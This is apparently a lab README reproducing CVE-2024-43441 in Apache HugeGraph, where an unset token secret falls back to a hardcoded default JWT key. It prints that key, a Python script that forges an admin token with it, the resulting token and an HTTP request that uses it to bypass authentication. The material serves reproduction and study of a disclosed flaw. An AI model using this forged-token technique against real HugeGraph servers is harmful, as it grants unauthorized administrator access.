# Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441)

[中文版本(Chinese version)](README.zh-cn.md)

Apache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.

A JWT token secret hardcoding vulnerability exists in Apache HugeGraph. When authentication is enabled but `auth.token_secret` is not configured, HugeGraph will use a hardcoded default JWT secret key with the value `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`. An attacker can use this default secret key to generate valid JWT tokens and bypass authentication to perform unauthorized operations.

References:

- <https://github.com/advisories/GHSA-f697-gm3h-xrf9>
- <https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246>

## Environment Setup

Execute the following command to start a Apache HugeGraph 1.3.0 server:

```
docker compose up -d
```

After the server is started, you can access the HugeGraph RESTful API at `http://your-ip:8080`.

By default, Apache HugeGraph supports two authentication modes: HTTP Basic Authentication and JWT Authentication. When starting the docker container, it will use the `PASSWORD` environment variable as the default administrator's password. Then you can access the API using HTTP Basic Authentication with the username "admin" and this password.

If you try to access the API without providing any authentication headers, you will receive the following error:

```json
{
    "exception": "class jakarta.ws.rs.NotAuthorizedException",
    "message": "Authentication credentials are required",
    "cause": ""
}
```

## Vulnerability Reproduce

Besides the default administrator's password, we can also use the default JWT secret key to generate a valid JWT token and bypass the authentication.

Generate a JWT token using the default secret key:

```python
# Install the jwt library by running `pip install pyjwt`
import jwt

# Generate JWT token using the default secret
token = jwt.encode(
    {
      "user_name": "admin",
      "user_id": "-30:admin",
      "exp": 9739523483
    },
    "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg",
    algorithm="HS256"
)
print(f"Generated JWT token: {token}")
# Output:
# Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```

Use the generated token to access protected endpoints:

```
GET /graphs HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg
```

You will receive the following response:

![](1.png)

If you remove the `Authorization` header, you will receive the following error:

![](2.png)
